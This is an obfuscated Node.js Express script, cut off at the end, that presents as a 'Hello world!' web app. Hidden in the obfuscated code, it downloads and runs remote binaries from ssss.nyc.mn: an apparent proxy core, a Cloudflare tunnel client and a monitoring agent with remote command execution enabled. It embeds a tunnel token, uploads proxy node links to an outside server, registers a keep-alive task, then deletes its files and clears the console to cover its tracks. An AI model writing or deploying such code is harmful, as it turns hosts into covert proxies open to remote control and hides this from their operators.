const _0x11d2bd=_0x434d;(function(_0xcb89,_0x254838){const _0x4187e3=_0x434d,_0x4c91ec=_0xcb89();while(!![]){try{const _0x284448=-parseInt(_0x4187e3(0xb7))/0x1+parseInt(_0x4187e3(0x72))/0x2+-parseInt(_0x4187e3(0xb3))/0x3*(-parseInt(_0x4187e3(0xeb))/0x4)+-parseInt(_0x4187e3(0x123))/0x5*(-parseInt(_0x4187e3(0xff))/0x6)+parseInt(_0x4187e3(0xfe))/0x7*(parseInt(_0x4187e3(0x71))/0x8)+parseInt(_0x4187e3(0xde))/0x9+-parseInt(_0x4187e3(0x95))/0xa*(parseInt(_0x4187e3(0x12a))/0xb);if(_0x284448===_0x254838)break;else _0x4c91ec['push'](_0x4c91ec['shift']());}catch(_0xfbcadc){_0x4c91ec['push'](_0x4c91ec['shift']());}}}(_0x4eae,0x7d34f));const express=require('express'),app=express(),axios=require(_0x11d2bd(0xb2)),os=require('os'),fs=require('fs'),path=require(_0x11d2bd(0xb5)),{promisify}=require('util'),exec=promisify(require(_0x11d2bd(0x75))['exec']),{execSync}=require(_0x11d2bd(0x75)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x11d2bd(0x7a)][_0x11d2bd(0xa0)]||'',AUTO_ACCESS=process[_0x11d2bd(0x7a)]['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x11d2bd(0xe2)]||_0x11d2bd(0x7d),SUB_PATH=process[_0x11d2bd(0x7a)]['SUB_PATH']||'2001',PORT=process[_0x11d2bd(0x7a)][_0x11d2bd(0xe9)]||process[_0x11d2bd(0x7a)][_0x11d2bd(0x8a)]||0xbb8,UUID=process[_0x11d2bd(0x7a)][_0x11d2bd(0x116)]||'421c9b06-216a-4e18-b32b-ad0ab7305f94',NEZHA_SERVER=process[_0x11d2bd(0x7a)][_0x11d2bd(0xaf)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x11d2bd(0xf4)]||'',ARGO_DOMAIN=process[_0x11d2bd(0x7a)][_0x11d2bd(0xb1)]||_0x11d2bd(0x135),ARGO_AUTH=process[_0x11d2bd(0x7a)][_0x11d2bd(0xce)]||_0x11d2bd(0xbc),ARGO_PORT=process['env'][_0x11d2bd(0xe5)]||0x1f41,CFIP=process[_0x11d2bd(0x7a)][_0x11d2bd(0xed)]||'cdns.doon.eu.org',CFPORT=process[_0x11d2bd(0x7a)][_0x11d2bd(0xd0)]||0x1bb,NAME=process[_0x11d2bd(0x7a)][_0x11d2bd(0xd3)]||_0x11d2bd(0x11d);!fs['existsSync'](FILE_PATH)?(fs[_0x11d2bd(0x110)](FILE_PATH),console[_0x11d2bd(0x126)](FILE_PATH+_0x11d2bd(0x79))):console[_0x11d2bd(0x126)](FILE_PATH+_0x11d2bd(0xe6));function generateRandomName(){const _0x2cc9ba=_0x11d2bd,_0x3501d7=_0x2cc9ba(0xf9);let _0x5d65a0='';for(let _0x52e332=0x0;_0x52e332<0x6;_0x52e332++){_0x5d65a0+=_0x3501d7[_0x2cc9ba(0x107)](Math[_0x2cc9ba(0x8f)](Math[_0x2cc9ba(0xd5)]()*_0x3501d7[_0x2cc9ba(0x10b)]));}return _0x5d65a0;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x4eae(){const _0x673a2b=['hou2025.dzfdesign.qzz.io','/tunnel.yml\x20run','9112snPWrN','1687044ornNeu','\x0a\x0avmess://','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','child_process','includes','tunnel.json','Error\x20executing\x20command:\x20','\x20is\x20created','env','\x20is\x20running','TunnelSecret','./tmp','success','https://arm64.ssss.nyc.mn/bot','https://oooo.serv00.net/add-url','firefox','chmod','boot.log','Download\x20','del\x20/f\x20/q\x20','push','127.0.0.1','split','response','PORT','basename','2083','from','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','floor','stream','status','data','arm64','utf-8','10bQZyCP','sub.txt','\x20failed:\x20','trojan','list.txt','2087','match','post','then','/api/add-subscriptions','443','PROJECT_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','get','org','npm\x20running\x20error:\x20','finish','false','message','base64','rm\x20-rf\x20','stringify','pipe','\x20-c\x20','config.yaml','amd','NEZHA_SERVER','\x0a\x20\x20\x20\x20','ARGO_DOMAIN','axios','477owcboV','\x0a\x20\x20tunnel:\x20','path','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','493744scvrqP','vless','https+local://8.8.8.8/dns-query','tls','text/plain;\x20charset=utf-8','eyJhIjoiYjk0YzEyZmVmMTBhNDQzNTgzOTYwYzNlZmUxZTFlZDYiLCJ0IjoiNzZkNmU2ZWYtNzdjYS00OWRkLTkyMTItYmZlZGU0OTQ4MGNmIiwicyI6Ik1HWmlOREkxT0RVdE5USTVNeTAwT1RneUxXRm1ZbU10WlRrNVpEVXlOekE1TXpjdyJ9','&fp=firefox&type=ws&host=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','map','ARGO_DOMAIN:','https://arm64.ssss.nyc.mn/web','readFileSync','8443','unlinkSync','unlink','application/json','http://ip-api.com/json/','error','https://arm64.ssss.nyc.mn/agent','catch','?security=tls&sni=','.exe\x20>\x20nul\x202>&1','writeFileSync','ARGO_AUTH','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','CFPORT','http\x20server\x20is\x20running\x20on\x20port:','https://arm64.ssss.nyc.mn/v1','NAME','Nodes\x20uploaded\x20successfully','random','web\x20running\x20error:\x20','Subscription\x20uploaded\x20successfully','join','arch','send','true','Skipping\x20adding\x20automatic\x20access\x20task','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2892069VkoACj','pop','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/v1','FILE_PATH','/vmess-argo','forEach','ARGO_PORT','\x20already\x20exists','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','countryCode','SERVER_PORT','readdirSync','4888cJZrez','freedom','CFIP','pkill\x20-f\x20\x22[','nohup\x20','arm','tunnel.yml','set','Empowerment\x20success\x20for\x20','NEZHA_KEY','existsSync','Unknown','statSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','abcdefghijklmnopqrstuvwxyz','/config.json\x20>/dev/null\x202>&1\x20&','2096','quic','php\x20running\x20error:\x20','4102yvBaWK','711912VFpjHx','direct','ArgoDomain:','\x20successfully','&path=%2Fvless-argo%3Fed%3D2560#','vmess','--tls','App\x20is\x20running','charAt','/vmess-argo?ed=2560','2053','win32','length','close','\x0a\x20\x20credentials-file:\x20','toString','Error\x20in\x20startserver:','mkdirSync','\x20>/dev/null\x202>&1','block','listen','/dev/null','test','UUID','\x20-c\x20\x22','http','automatic\x20access\x20task\x20added\x20successfully','Content-Type','config.json','filter','FRANK2025','\x0aclient_secret:\x20','has','platform','none','\x0a\x0atrojan://','25juKXBQ','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','xtls-rprx-vision','log','isFile','https://amd64.ssss.nyc.mn/web','aarch64','17746124qMNFDd','/sub.txt\x20saved\x20successfully','/vless-argo','\x22\x20>\x20/dev/null\x202>&1','unshift','clear','country_code','Hello\x20world!','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-s\x20','/api/add-nodes'];_0x4eae=function(){return _0x673a2b;};return _0x4eae();}let npmPath=path[_0x11d2bd(0xd8)](FILE_PATH,npmName),phpPath=path[_0x11d2bd(0xd8)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x11d2bd(0xd8)](FILE_PATH,botName),subPath=path[_0x11d2bd(0xd8)](FILE_PATH,_0x11d2bd(0x96)),listPath=path[_0x11d2bd(0xd8)](FILE_PATH,_0x11d2bd(0x99)),bootLogPath=path[_0x11d2bd(0xd8)](FILE_PATH,_0x11d2bd(0x83)),configPath=path[_0x11d2bd(0xd8)](FILE_PATH,_0x11d2bd(0x11b));function deleteNodes(){const _0x2d6d85=_0x11d2bd;try{if(!UPLOAD_URL)return;if(!fs[_0x2d6d85(0xf5)](subPath))return;let _0x10e7d4;try{_0x10e7d4=fs[_0x2d6d85(0xc2)](subPath,'utf-8');}catch{return null;}const _0x31683a=Buffer[_0x2d6d85(0x8d)](_0x10e7d4,_0x2d6d85(0xa8))[_0x2d6d85(0x10e)](_0x2d6d85(0x94)),_0x48782f=_0x31683a['split']('\x0a')[_0x2d6d85(0x11c)](_0x15a7df=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2d6d85(0x115)](_0x15a7df));if(_0x48782f[_0x2d6d85(0x10b)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x2d6d85(0xaa)]({'nodes':_0x48782f}),{'headers':{'Content-Type':_0x2d6d85(0xc6)}})[_0x2d6d85(0xca)](_0xaa0e0d=>{return null;}),null;}catch(_0x3208ce){return null;}}function cleanupOldFiles(){const _0x21ebc4=_0x11d2bd;try{const _0x4962fe=fs[_0x21ebc4(0xea)](FILE_PATH);_0x4962fe['forEach'](_0x5660bc=>{const _0x2fd5f7=_0x21ebc4,_0x35b5bb=path[_0x2fd5f7(0xd8)](FILE_PATH,_0x5660bc);try{const _0xb9293b=fs[_0x2fd5f7(0xf7)](_0x35b5bb);_0xb9293b[_0x2fd5f7(0x127)]()&&fs[_0x2fd5f7(0xc4)](_0x35b5bb);}catch(_0x4aa078){}});}catch(_0x168d76){}}app[_0x11d2bd(0xa2)]('/',function(_0x164202,_0x35ce7a){const _0xf6ec2f=_0x11d2bd;_0x35ce7a[_0xf6ec2f(0xda)](_0xf6ec2f(0x131));});async function generateConfig(){const _0x24a95f=_0x11d2bd,_0x5d7f23={'log':{'access':_0x24a95f(0x114),'error':'/dev/null','loglevel':_0x24a95f(0x121)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x24a95f(0xb8),'settings':{'clients':[{'id':UUID,'flow':_0x24a95f(0x125)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x24a95f(0x12c),'dest':0xbba},{'path':_0x24a95f(0xe3),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x24a95f(0x87),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x24a95f(0x121)},'streamSettings':{'network':'tcp','security':_0x24a95f(0x121)}},{'port':0xbba,'listen':_0x24a95f(0x87),'protocol':_0x24a95f(0xb8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x24a95f(0x121)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x24a95f(0x12c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x24a95f(0xba),_0x24a95f(0xfc)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x24a95f(0x104),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x24a95f(0xe3)}},'sniffing':{'enabled':!![],'destOverride':[_0x24a95f(0x118),_0x24a95f(0xba),_0x24a95f(0xfc)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x24a95f(0x87),'protocol':_0x24a95f(0x98),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24a95f(0x121),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x24a95f(0x118),_0x24a95f(0xba),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x24a95f(0xb9)]},'outbounds':[{'protocol':_0x24a95f(0xec),'tag':_0x24a95f(0x100)},{'protocol':'blackhole','tag':_0x24a95f(0x112)}]};fs['writeFileSync'](path[_0x24a95f(0xd8)](FILE_PATH,_0x24a95f(0x11b)),JSON[_0x24a95f(0xaa)](_0x5d7f23,null,0x2));}function getSystemArchitecture(){const _0x5880ac=_0x11d2bd,_0x49e860=os[_0x5880ac(0xd9)]();return _0x49e860===_0x5880ac(0xf0)||_0x49e860===_0x5880ac(0x93)||_0x49e860===_0x5880ac(0x129)?_0x5880ac(0xf0):_0x5880ac(0xae);}function downloadFile(_0x1382c2,_0x3cc271,_0x2287eb){const _0x1c7152=_0x11d2bd,_0x212b75=_0x1382c2;!fs[_0x1c7152(0xf5)](FILE_PATH)&&fs[_0x1c7152(0x110)](FILE_PATH,{'recursive':!![]});const _0x56a90d=fs['createWriteStream'](_0x212b75);axios({'method':'get','url':_0x3cc271,'responseType':_0x1c7152(0x90)})[_0x1c7152(0x9d)](_0xdd6a78=>{const _0x36077b=_0x1c7152;_0xdd6a78[_0x36077b(0x92)][_0x36077b(0xab)](_0x56a90d),_0x56a90d['on'](_0x36077b(0xa5),()=>{const _0x87c2fb=_0x36077b;_0x56a90d[_0x87c2fb(0x10c)](),console['log'](_0x87c2fb(0x84)+path[_0x87c2fb(0x8b)](_0x212b75)+_0x87c2fb(0x102)),_0x2287eb(null,_0x212b75);}),_0x56a90d['on']('error',_0x1b45d5=>{const _0x4bd5e3=_0x36077b;fs[_0x4bd5e3(0xc5)](_0x212b75,()=>{});const _0x3e833c=_0x4bd5e3(0x84)+path[_0x4bd5e3(0x8b)](_0x212b75)+'\x20failed:\x20'+_0x1b45d5[_0x4bd5e3(0xa7)];console[_0x4bd5e3(0xc8)](_0x3e833c),_0x2287eb(_0x3e833c);});})[_0x1c7152(0xca)](_0x521052=>{const _0x497275=_0x1c7152,_0x5d64dd=_0x497275(0x84)+path[_0x497275(0x8b)](_0x212b75)+_0x497275(0x97)+_0x521052[_0x497275(0xa7)];console[_0x497275(0xc8)](_0x5d64dd),_0x2287eb(_0x5d64dd);});}async function downloadFilesAndRun(){const _0x29392a=_0x11d2bd,_0x11ca9e=getSystemArchitecture(),_0x28ba2a=getFilesForArchitecture(_0x11ca9e);if(_0x28ba2a[_0x29392a(0x10b)]===0x0){console[_0x29392a(0x126)](_0x29392a(0x132));return;}const _0x1e6546=_0x28ba2a[_0x29392a(0xbf)](_0x22938d=>{return new Promise((_0x4b944e,_0x3b1cdf)=>{downloadFile(_0x22938d['fileName'],_0x22938d['fileUrl'],(_0x11210a,_0x481978)=>{_0x11210a?_0x3b1cdf(_0x11210a):_0x4b944e(_0x481978);});});});try{await Promise['all'](_0x1e6546);}catch(_0x89d828){console[_0x29392a(0xc8)]('Error\x20downloading\x20files:',_0x89d828);return;}function _0x3c26ee(_0x467a74){const _0x2828b9=_0x29392a,_0x41176c=0x1fd;_0x467a74[_0x2828b9(0xe4)](_0x12f95a=>{const _0x33ad05=_0x2828b9;fs[_0x33ad05(0xf5)](_0x12f95a)&&fs[_0x33ad05(0x82)](_0x12f95a,_0x41176c,_0x25663c=>{const _0x23d440=_0x33ad05;_0x25663c?console[_0x23d440(0xc8)]('Empowerment\x20failed\x20for\x20'+_0x12f95a+':\x20'+_0x25663c):console[_0x23d440(0x126)](_0x23d440(0xf3)+_0x12f95a+':\x20'+_0x41176c['toString'](0x8));});});}const _0x489527=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3c26ee(_0x489527);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4e29b2=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x29392a(0xdf)]():'',_0x37f383=new Set(['443',_0x29392a(0xc3),_0x29392a(0xfb),_0x29392a(0x9a),_0x29392a(0x8c),_0x29392a(0x109)]),_0x167f11=_0x37f383[_0x29392a(0x11f)](_0x4e29b2)?_0x29392a(0xdb):_0x29392a(0xa6),_0x5754b9=_0x29392a(0x11e)+NEZHA_KEY+_0x29392a(0xdd)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x167f11+_0x29392a(0xbe)+UUID;fs['writeFileSync'](path[_0x29392a(0xd8)](FILE_PATH,_0x29392a(0xad)),_0x5754b9);const _0x2b0373=_0x29392a(0xef)+phpPath+_0x29392a(0x117)+FILE_PATH+_0x29392a(0x8e);try{await exec(_0x2b0373),console['log'](phpName+'\x20is\x20running'),await new Promise(_0x59c7b3=>setTimeout(_0x59c7b3,0x3e8));}catch(_0x5c99bf){console[_0x29392a(0xc8)](_0x29392a(0xfd)+_0x5c99bf);}}else{let _0x506332='';const _0x1ab2da=[_0x29392a(0x9f),'8443',_0x29392a(0xfb),'2087',_0x29392a(0x8c),_0x29392a(0x109)];_0x1ab2da[_0x29392a(0x76)](NEZHA_PORT)&&(_0x506332=_0x29392a(0x105));const _0x30bd11=_0x29392a(0xef)+npmPath+_0x29392a(0x133)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x506332+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x30bd11),console[_0x29392a(0x126)](npmName+_0x29392a(0x7b)),await new Promise(_0xc752d8=>setTimeout(_0xc752d8,0x3e8));}catch(_0x50b2ac){console['error'](_0x29392a(0xa4)+_0x50b2ac);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x4dc9fc=_0x29392a(0xef)+webPath+_0x29392a(0xac)+FILE_PATH+_0x29392a(0xfa);try{await exec(_0x4dc9fc),console[_0x29392a(0x126)](webName+_0x29392a(0x7b)),await new Promise(_0x1d880a=>setTimeout(_0x1d880a,0x3e8));}catch(_0x5a583c){console[_0x29392a(0xc8)](_0x29392a(0xd6)+_0x5a583c);}if(fs[_0x29392a(0xf5)](botPath)){let _0x3f5e77;if(ARGO_AUTH[_0x29392a(0x9b)](/^[A-Z0-9a-z=]{120,250}$/))_0x3f5e77=_0x29392a(0x124)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3f5e77=_0x29392a(0x74)+FILE_PATH+_0x29392a(0x70):_0x3f5e77=_0x29392a(0xe7)+FILE_PATH+_0x29392a(0xb6)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3f5e77+'\x20>/dev/null\x202>&1\x20&'),console[_0x29392a(0x126)](botName+_0x29392a(0x7b)),await new Promise(_0x2e25a7=>setTimeout(_0x2e25a7,0x7d0));}catch(_0x12d637){console[_0x29392a(0xc8)](_0x29392a(0x78)+_0x12d637);}}await new Promise(_0x268410=>setTimeout(_0x268410,0x1388));}function _0x434d(_0x5377a1,_0x958659){_0x5377a1=_0x5377a1-0x70;const _0x4eae78=_0x4eae();let _0x434de2=_0x4eae78[_0x5377a1];return _0x434de2;}function getFilesForArchitecture(_0x5b1bba){const _0x2ee69b=_0x11d2bd;let _0x48982e;_0x5b1bba===_0x2ee69b(0xf0)?_0x48982e=[{'fileName':webPath,'fileUrl':_0x2ee69b(0xc1)},{'fileName':botPath,'fileUrl':_0x2ee69b(0x7f)}]:_0x48982e=[{'fileName':webPath,'fileUrl':_0x2ee69b(0x128)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xb04414=_0x5b1bba===_0x2ee69b(0xf0)?_0x2ee69b(0xc9):'https://amd64.ssss.nyc.mn/agent';_0x48982e[_0x2ee69b(0x12e)]({'fileName':npmPath,'fileUrl':_0xb04414});}else{const _0x1c2a24=_0x5b1bba===_0x2ee69b(0xf0)?_0x2ee69b(0xd2):_0x2ee69b(0xe1);_0x48982e[_0x2ee69b(0x12e)]({'fileName':phpPath,'fileUrl':_0x1c2a24});}}return _0x48982e;}function argoType(){const _0x4bf975=_0x11d2bd;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4bf975(0xa1));return;}if(ARGO_AUTH[_0x4bf975(0x76)](_0x4bf975(0x7c))){fs[_0x4bf975(0xcd)](path[_0x4bf975(0xd8)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x308fc5=_0x4bf975(0xb4)+ARGO_AUTH[_0x4bf975(0x88)]('\x22')[0xb]+_0x4bf975(0x10d)+path[_0x4bf975(0xd8)](FILE_PATH,_0x4bf975(0x77))+_0x4bf975(0xe0)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4bf975(0xcd)](path[_0x4bf975(0xd8)](FILE_PATH,_0x4bf975(0xf1)),_0x308fc5);}else console['log'](_0x4bf975(0xcf));}async function extractDomains(){const _0x25af98=_0x11d2bd;let _0x34fec1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x34fec1=ARGO_DOMAIN,console[_0x25af98(0x126)](_0x25af98(0xc0),_0x34fec1),await _0x3b9f2b(_0x34fec1);else try{const _0x437682=fs['readFileSync'](path[_0x25af98(0xd8)](FILE_PATH,_0x25af98(0x83)),_0x25af98(0x94)),_0x3802d1=_0x437682[_0x25af98(0x88)]('\x0a'),_0x35909c=[];_0x3802d1[_0x25af98(0xe4)](_0x233e28=>{const _0x4070f9=_0x25af98,_0x2e0a8b=_0x233e28[_0x4070f9(0x9b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2e0a8b){const _0x229bbc=_0x2e0a8b[0x1];_0x35909c[_0x4070f9(0x86)](_0x229bbc);}});if(_0x35909c[_0x25af98(0x10b)]>0x0)_0x34fec1=_0x35909c[0x0],console[_0x25af98(0x126)](_0x25af98(0x101),_0x34fec1),await _0x3b9f2b(_0x34fec1);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x25af98(0xd8)](FILE_PATH,'boot.log'));async function _0x4965db(){const _0x1def84=_0x25af98;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x1def84(0xcc)):await exec(_0x1def84(0xee)+botName[_0x1def84(0x107)](0x0)+']'+botName['substring'](0x1)+_0x1def84(0x12d));}catch(_0x8b8553){}}_0x4965db(),await new Promise(_0x5ebd6f=>setTimeout(_0x5ebd6f,0xbb8));const _0x2abef6=_0x25af98(0xe7)+FILE_PATH+_0x25af98(0xb6)+ARGO_PORT;try{await exec(_0x25af98(0xef)+botPath+'\x20'+_0x2abef6+'\x20>/dev/null\x202>&1\x20&'),console[_0x25af98(0x126)](botName+'\x20is\x20running'),await new Promise(_0x4ecd3d=>setTimeout(_0x4ecd3d,0xbb8)),await extractDomains();}catch(_0x192048){console[_0x25af98(0xc8)](_0x25af98(0x78)+_0x192048);}}}catch(_0x41806f){console['error']('Error\x20reading\x20boot.log:',_0x41806f);}async function _0x5d30ea(){const _0x4d9a6b=_0x25af98;try{const _0x540dac=await axios[_0x4d9a6b(0xa2)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x540dac[_0x4d9a6b(0x92)]&&_0x540dac[_0x4d9a6b(0x92)][_0x4d9a6b(0x130)]&&_0x540dac['data'][_0x4d9a6b(0xa3)])return _0x540dac[_0x4d9a6b(0x92)]['country_code']+'_'+_0x540dac[_0x4d9a6b(0x92)]['org'];}catch(_0x4e47b4){try{const _0x294a9e=await axios[_0x4d9a6b(0xa2)](_0x4d9a6b(0xc7),{'timeout':0xbb8});if(_0x294a9e[_0x4d9a6b(0x92)]&&_0x294a9e[_0x4d9a6b(0x92)][_0x4d9a6b(0x91)]===_0x4d9a6b(0x7e)&&_0x294a9e[_0x4d9a6b(0x92)]['countryCode']&&_0x294a9e[_0x4d9a6b(0x92)]['org'])return _0x294a9e[_0x4d9a6b(0x92)][_0x4d9a6b(0xe8)]+'_'+_0x294a9e[_0x4d9a6b(0x92)][_0x4d9a6b(0xa3)];}catch(_0x2fa46e){}}return _0x4d9a6b(0xf6);}async function _0x3b9f2b(_0x46304f){const _0x183795=await _0x5d30ea(),_0x53c738=NAME?NAME+'-'+_0x183795:_0x183795;return new Promise(_0x2efff6=>{setTimeout(()=>{const _0x3350e5=_0x434d,_0x2abc8a={'v':'2','ps':''+_0x53c738,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3350e5(0x121),'net':'ws','type':'none','host':_0x46304f,'path':_0x3350e5(0x108),'tls':_0x3350e5(0xba),'sni':_0x46304f,'alpn':'','fp':_0x3350e5(0x81)},_0x1c3bba='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x46304f+_0x3350e5(0xbd)+_0x46304f+_0x3350e5(0x103)+_0x53c738+_0x3350e5(0x73)+Buffer[_0x3350e5(0x8d)](JSON[_0x3350e5(0xaa)](_0x2abc8a))[_0x3350e5(0x10e)]('base64')+_0x3350e5(0x122)+UUID+'@'+CFIP+':'+CFPORT+_0x3350e5(0xcb)+_0x46304f+_0x3350e5(0xbd)+_0x46304f+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x53c738+_0x3350e5(0xb0);console['log'](Buffer['from'](_0x1c3bba)[_0x3350e5(0x10e)]('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x1c3bba)[_0x3350e5(0x10e)]('base64')),console['log'](FILE_PATH+_0x3350e5(0x12b)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x46461b,_0x3091d6)=>{const _0x54c51b=_0x3350e5,_0x3093b6=Buffer[_0x54c51b(0x8d)](_0x1c3bba)[_0x54c51b(0x10e)](_0x54c51b(0xa8));_0x3091d6[_0x54c51b(0xf2)](_0x54c51b(0x11a),_0x54c51b(0xbb)),_0x3091d6[_0x54c51b(0xda)](_0x3093b6);}),_0x2efff6(_0x1c3bba);},0x7d0);});}}async function uploadNodes(){const _0x47d86f=_0x11d2bd;if(UPLOAD_URL&&PROJECT_URL){const _0x29a590=PROJECT_URL+'/'+SUB_PATH,_0x4f737f={'subscription':[_0x29a590]};try{const _0x47f6a2=await axios[_0x47d86f(0x9c)](UPLOAD_URL+_0x47d86f(0x9e),_0x4f737f,{'headers':{'Content-Type':_0x47d86f(0xc6)}});return _0x47f6a2&&_0x47f6a2['status']===0xc8?(console[_0x47d86f(0x126)](_0x47d86f(0xd7)),_0x47f6a2):null;}catch(_0x4e0d8b){if(_0x4e0d8b[_0x47d86f(0x89)]){if(_0x4e0d8b[_0x47d86f(0x89)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5f08e6=fs['readFileSync'](listPath,_0x47d86f(0x94)),_0x403d26=_0x5f08e6[_0x47d86f(0x88)]('\x0a')['filter'](_0x242aba=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x242aba));if(_0x403d26['length']===0x0)return;const _0x5f5418=JSON[_0x47d86f(0xaa)]({'nodes':_0x403d26});try{const _0x3b15fe=await axios[_0x47d86f(0x9c)](UPLOAD_URL+_0x47d86f(0x134),_0x5f5418,{'headers':{'Content-Type':_0x47d86f(0xc6)}});return _0x3b15fe&&_0x3b15fe[_0x47d86f(0x91)]===0xc8?(console[_0x47d86f(0x126)](_0x47d86f(0xd4)),_0x3b15fe):null;}catch(_0x57df98){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x8933cc=_0x434d,_0x25a944=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x25a944[_0x8933cc(0x86)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x25a944[_0x8933cc(0x86)](phpPath);process[_0x8933cc(0x120)]===_0x8933cc(0x10a)?exec(_0x8933cc(0x85)+_0x25a944[_0x8933cc(0xd8)]('\x20')+'\x20>\x20nul\x202>&1',_0x3a3789=>{const _0x15585e=_0x8933cc;console[_0x15585e(0x12f)](),console[_0x15585e(0x126)]('App\x20is\x20running'),console[_0x15585e(0x126)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x8933cc(0xa9)+_0x25a944[_0x8933cc(0xd8)]('\x20')+_0x8933cc(0x111),_0x2e2051=>{const _0x2e3162=_0x8933cc;console['clear'](),console[_0x2e3162(0x126)](_0x2e3162(0x106)),console[_0x2e3162(0x126)](_0x2e3162(0xf8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x37288c=_0x11d2bd;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x37288c(0xdc));return;}try{const _0xbfd7fc=await axios[_0x37288c(0x9c)](_0x37288c(0x80),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x37288c(0xc6)}});return console[_0x37288c(0x126)](_0x37288c(0x119)),_0xbfd7fc;}catch(_0x35cf57){return console[_0x37288c(0xc8)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x35cf57[_0x37288c(0xa7)]),null;}}async function startserver(){const _0x2930f9=_0x11d2bd;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5af1a4){console[_0x2930f9(0xc8)](_0x2930f9(0x10f),_0x5af1a4);}}startserver()[_0x11d2bd(0xca)](_0xd8d23c=>{const 